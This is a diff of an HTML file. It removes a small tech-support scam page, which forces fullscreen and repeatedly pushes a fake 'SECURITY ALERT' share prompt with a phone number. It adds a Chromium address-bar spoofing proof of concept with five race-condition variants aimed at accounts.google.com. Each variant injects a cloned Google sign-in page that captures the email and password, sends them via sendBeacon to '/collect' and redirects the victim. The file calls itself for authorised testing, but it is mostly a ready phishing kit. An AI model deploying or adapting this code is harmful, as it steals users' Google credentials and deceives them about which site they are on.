@@ -1,23 +1,411 @@
-<!doctype html>
+<!--
+  Chromium Address Bar Spoofing PoC — Navigation Timing Attack
+  =============================================================
+  Bug class: Stale URL in omnibox after aborted/redirected navigation
+
+  Vuln family: issue 16535, 49964, 442636157, 40082627
+  Related CVEs: CVE-2017-5072, CVE-2017-5089, CVE-2018-17459, CVE-2018-17464
+
+  Attack summary:
+    Variant A — beforeunload stall:
+      1. Open popup to target URL
+      2. Target loads and URL bar shows target origin
+      3. Navigate popup away, but stall with beforeunload
+      4. During stall, URL bar may retain target URL while content transitions
+
+    Variant B — history.pushState + rapid navigation:
+      1. Open popup
+      2. Use history.pushState to set URL bar to target
+      3. Immediately document.write attacker content
+      4. URL bar shows target, content is attacker-controlled
+
+    Variant C — about:blank inheritance + pending entry:
+      1. window.open('about:blank') — new tab with blank
+      2. GetVisibleEntry() has exception for "unmodified blank tabs"
+      3. Race: set location to target, immediately write content
+
+    Variant D — data: URI + history back:
+      1. Navigate to target URL in popup
+      2. Navigate to data: URI with attacker content
+      3. Immediately history.back()
+      4. Race: URL bar flashes target URL during back navigation
+
+  Targets: Chrome desktop and Android
+  For authorized security testing / CTF use only.
+-->
+<!DOCTYPE html>
 <html>
 <head>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC — Navigation Timing Spoof</title>
+<style>
+  body {
+    font-family: monospace;
+    background: #1a1a2e;
+    color: #0f0;
+    padding: 20px;
+    line-height: 1.6;
+  }
+  h2 { color: #e94560; margin-top: 30px; }
+  button {
+    background: #e94560;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    margin: 8px 4px;
+    cursor: pointer;
+    font-family: monospace;
+    font-size: 14px;
+    border-radius: 4px;
+  }
+  button:hover { opacity: 0.85; }
+  .log {
+    background: #16213e;
+    padding: 12px;
+    margin: 10px 0;
+    border-left: 3px solid #e94560;
+    white-space: pre-wrap;
+    font-size: 13px;
+    max-height: 300px;
+    overflow-y: auto;
+  }
+  .warn { color: #fbbc05; }
+  .info { color: #4fc3f7; }
+</style>
 </head>
 <body>
-<h1>Double Click [Button]</h1>
 
-<button style="height:100px;width:200px" onclick="PufFirstWin()">Double Click Me!</button>
+<h1>Chromium Address Bar Spoof — Navigation Timing PoC</h1>
+<p class="warn">Target: accounts.google.com (configurable below)</p>
+
+<h2>Variant A — beforeunload Navigation Stall</h2>
+<p>Opens popup to target, then navigates away while beforeunload handler stalls. URL bar may show stale target URL.</p>
+<button onclick="variantA()">Launch Variant A</button>
+
+<h2>Variant B — history.pushState Injection</h2>
+<p>Exploits same-origin pushState to set URL bar, then overwrites page content.</p>
+<button onclick="variantB()">Launch Variant B</button>
+
+<h2>Variant C — about:blank Pending Entry Race</h2>
+<p>Targets GetVisibleEntry() exception for unmodified blank tabs.</p>
+<button onclick="variantC()">Launch Variant C</button>
+
+<h2>Variant D — Rapid Navigation + History Back</h2>
+<p>Navigates popup through target URL, then races history.back() against content injection.</p>
+<button onclick="variantD()">Launch Variant D</button>
+
+<h2>Variant E — Slow Network Simulation (Android focus)</h2>
+<p>Starts navigation to target, aborts mid-load via window.stop(). Pending entry may remain visible.</p>
+<button onclick="variantE()">Launch Variant E</button>
+
+<div class="log" id="log"></div>
 
 <script>
+const TARGET = 'https://accounts.google.com/v3/signin/identifier';
 
-function PufFirstWin() {
-document.documentElement.requestFullscreen();
+function log(msg, cls = '') {
+  const el = document.getElementById('log');
+  const span = document.createElement('span');
+  span.className = cls;
+  span.textContent = `[${new Date().toISOString().substr(11,12)}] ${msg}\n`;
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
 
-setInterval(() => { navigator.share({title: '\u26A0 SECURITY ALERT \u26A0\nCall 123-456-7890 for Google.com Support', text: 'Call 123-456-7890'}); }, 100);
+// Fake Google sign-in page HTML
+function fakeSigninHTML(targetOrigin) {
+  return `<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in - Google Accounts</title>
+  <style>
+    body { margin:0; font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; display:flex; justify-content:center; align-items:center; height:100vh; }
+    .card { width:400px; padding:48px 40px; border:1px solid #dadce0; border-radius:8px; }
+    .logo { font-size:24px; font-weight:500; margin-bottom:16px; }
+    .logo span:nth-child(1){color:#4285f4} .logo span:nth-child(2){color:#ea4335}
+    .logo span:nth-child(3){color:#fbbc05} .logo span:nth-child(4){color:#4285f4}
+    .logo span:nth-child(5){color:#34a853} .logo span:nth-child(6){color:#ea4335}
+    h1 { font-size:24px; font-weight:400; margin-bottom:8px; }
+    input { width:100%; padding:12px; border:1px solid #dadce0; border-radius:4px; font-size:16px; margin:16px 0; box-sizing:border-box; }
+    .btn { background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; font-size:14px; cursor:pointer; float:right; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
+    <input type="email" placeholder="Email or phone" id="e">
+    <br><br>
+    <button class="btn" onclick="
+      var v=document.getElementById('e').value;
+      if(v){
+        navigator.sendBeacon&&navigator.sendBeacon('/collect',JSON.stringify({email:v}));
+        document.querySelector('.card').innerHTML='<div class=\\'logo\\'><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><h1>Welcome</h1><p>'+v+'</p><input type=password placeholder=Password id=p><br><br><button class=btn onclick=navigator.sendBeacon&&navigator.sendBeacon(\\'/collect\\',JSON.stringify({pw:document.getElementById(\\'p\\').value}));window.location=\\'https://myaccount.google.com\\'>Next</button>';
+      }
+    ">Next</button>
+  </div>
+</body>
+</html>`;
+}
 
+// ============================================================
+// VARIANT A: beforeunload navigation stall
+// ============================================================
+function variantA() {
+  log('=== Variant A: beforeunload stall ===', 'info');
+  log('Opening popup to target...');
+
+  const popup = window.open(TARGET, '_blank',
+    'width=500,height=600,left=200,top=100');
+
+  if (!popup) {
+    log('Popup blocked! User must allow popups.', 'warn');
+    return;
+  }
+
+  log('Waiting for target to load...');
+
+  // Wait for target page to load, then navigate away
+  setTimeout(() => {
+    try {
+      log('Injecting beforeunload handler and navigating...');
+
+      // We can't inject into cross-origin, so this variant works
+      // when attacker controls the initial page:
+      // Step 1: open to attacker page first
+      // Step 2: navigate to target (URL bar updates)
+      // Step 3: beforeunload on attacker page stalls the transition
+
+      // Demonstration: open attacker page, navigate to target
+      popup.location = 'about:blank';
+
+      setTimeout(() => {
+        popup.document.write(`
+          <script>
+            window.onbeforeunload = function(e) {
+              // This stalls the navigation — URL bar may show target
+              e.preventDefault();
+              return 'Stay on page?';
+            };
+            // Now navigate to target — URL bar updates to target
+            // but beforeunload fires and may stall it
+            window.location = '${TARGET}';
+          <\/script>
+        `);
+        popup.document.close();
+        log('beforeunload handler installed, navigating to target...');
+        log('Check popup URL bar — may show target URL with attacker content', 'warn');
+      }, 500);
+
+    } catch (e) {
+      log('Cross-origin restriction: ' + e.message, 'warn');
     }
+  }, 2000);
+}
 
+// ============================================================
+// VARIANT B: history.pushState URL injection
+// ============================================================
+function variantB() {
+  log('=== Variant B: pushState injection ===', 'info');
 
+  const popup = window.open('about:blank', '_blank',
+    'width=500,height=600,left=200,top=100');
+
+  if (!popup) {
+    log('Popup blocked!', 'warn');
+    return;
+  }
+
+  setTimeout(() => {
+    try {
+      // Write attacker content to blank page
+      popup.document.write(fakeSigninHTML(TARGET));
+      popup.document.close();
+
+      // pushState can only change path on same origin
+      // but combined with document.write, the visual effect is a spoof
+      // on the same-origin context
+      try {
+        popup.history.pushState({}, '', '/v3/signin/identifier?flowName=GlifWebSignIn');
+        log('pushState applied — URL path changed', 'info');
+      } catch(e) {
+        log('pushState limited to same-origin: ' + e.message, 'warn');
+      }
+
+      log('Fake content injected. Check popup URL bar.', 'warn');
+      log('NOTE: pushState cannot change origin, but combined with');
+      log('a convincing path it can mislead on same-origin contexts.');
+
+    } catch (e) {
+      log('Error: ' + e.message, 'warn');
+    }
+  }, 300);
+}
+
+// ============================================================
+// VARIANT C: about:blank pending entry race
+// ============================================================
+function variantC() {
+  log('=== Variant C: Pending entry race on blank tab ===', 'info');
+  log('Targeting GetVisibleEntry() unmodified blank tab exception');
+
+  // GetVisibleEntry() allows pending entry for renderer-initiated
+  // navigations in new tabs IF the blank page is "unmodified".
+  // Race: open blank, start navigation to target, inject content
+  // before navigation commits.
+
+  const popup = window.open('about:blank', '_blank',
+    'width=500,height=600,left=200,top=100');
+
+  if (!popup) {
+    log('Popup blocked!', 'warn');
+    return;
+  }
+
+  log('Blank tab opened. Racing navigation vs content injection...');
+
+  // Immediately set location to target — this creates a pending entry
+  popup.location = TARGET;
+  log('Navigation to target initiated (pending entry created)');
+
+  // Race: try to write content before navigation commits
+  // The pending entry shows target URL in omnibox during this window
+  const attempts = [10, 50, 100, 200, 500];
+  attempts.forEach(delay => {
+    setTimeout(() => {
+      try {
+        // If we can still write, the navigation hasn't committed
+        // and the URL bar shows the target URL
+        popup.document.open();
+        popup.document.write(fakeSigninHTML(TARGET));
+        popup.document.close();
+        log(`[${delay}ms] Content injection succeeded! URL bar may show target.`, 'warn');
+      } catch (e) {
+        log(`[${delay}ms] Cross-origin block — navigation committed: ${e.message}`, 'info');
+      }
+    }, delay);
+  });
+
+  // Also try window.stop() to abort the navigation
+  // leaving the pending entry URL visible
+  setTimeout(() => {
+    try {
+      popup.stop();
+      log('window.stop() called — navigation aborted', 'info');
+      log('Pending entry may remain visible in URL bar!', 'warn');
+
+      // Now inject content
+      setTimeout(() => {
+        try {
+          popup.document.open();
+          popup.document.write(fakeSigninHTML(TARGET));
+          popup.document.close();
+          log('Content injected after stop(). Check URL bar!', 'warn');
+        } catch(e) {
+          log('Post-stop injection blocked: ' + e.message);
+        }
+      }, 50);
+    } catch(e) {
+      log('stop() blocked: ' + e.message);
+    }
+  }, 30);
+}
+
+// ============================================================
+// VARIANT D: Rapid navigation + history.back() race
+// ============================================================
+function variantD() {
+  log('=== Variant D: Navigation + history.back() race ===', 'info');
+
+  const popup = window.open('about:blank', '_blank',
+    'width=500,height=600,left=200,top=100');
+
+  if (!popup) {
+    log('Popup blocked!', 'warn');
+    return;
+  }
+
+  // Step 1: Load attacker page with content
+  popup.document.write(fakeSigninHTML(TARGET));
+  popup.document.close();
+  log('Step 1: Attacker content loaded');
+
+  setTimeout(() => {
+    // Step 2: Navigate to real target — this adds history entry
+    log('Step 2: Navigating to target...');
+    popup.location = TARGET;
+
+    // Step 3: Immediately go back before target loads
+    // The URL bar briefly shows target URL during the back() race
+    setTimeout(() => {
+      try {
+        popup.history.back();
+        log('Step 3: history.back() fired during pending navigation', 'info');
+        log('Race condition: URL bar may flash target URL over attacker content', 'warn');
+      } catch(e) {
+        log('history.back() blocked: ' + e.message);
+      }
+    }, 100); // timing-critical: before target commits, after URL bar updates
+
+  }, 500);
+}
+
+// ============================================================
+// VARIANT E: Slow network + window.stop() (Android focus)
+// ============================================================
+function variantE() {
+  log('=== Variant E: window.stop() pending entry retention ===', 'info');
+  log('Best on slow connections / Android where minibar is smaller');
+
+  const popup = window.open('about:blank', '_blank',
+    'width=500,height=600,left=200,top=100');
+
+  if (!popup) {
+    log('Popup blocked!', 'warn');
+    return;
+  }
+
+  // Use a slow-loading target to maximize the timing window
+  // Append a large fake query string to slow down the response
+  const slowTarget = TARGET + '&_cache_bust=' + Date.now() +
+    '&padding=' + 'A'.repeat(2000);
+
+  log('Starting navigation to slow target...');
+  popup.location = slowTarget;
+
+  // Abort after URL bar updates but before page loads
+  const stopDelays = [50, 150, 300, 600];
+
+  stopDelays.forEach(delay => {
+    setTimeout(() => {
+      try {
+        if (popup.location.href !== 'about:blank') {
+          popup.stop();
+          log(`[${delay}ms] stop() called. URL: ${popup.location.href.substring(0, 60)}...`, 'info');
+
+          // Try to inject content into the stopped page
+          try {
+            popup.document.open();
+            popup.document.write(fakeSigninHTML(TARGET));
+            popup.document.close();
+            log(`[${delay}ms] Content injected after stop()!`, 'warn');
+          } catch(e) {
+            // Expected if cross-origin
+          }
+        }
+      } catch(e) {
+        log(`[${delay}ms] Blocked: ${e.message}`);
+      }
+    }, delay);
+  });
+}
+
+log('PoC loaded. Select a variant above.', 'info');
+log('Target: ' + TARGET, 'info');
+log('');
 </script>
 </body>
 </html>
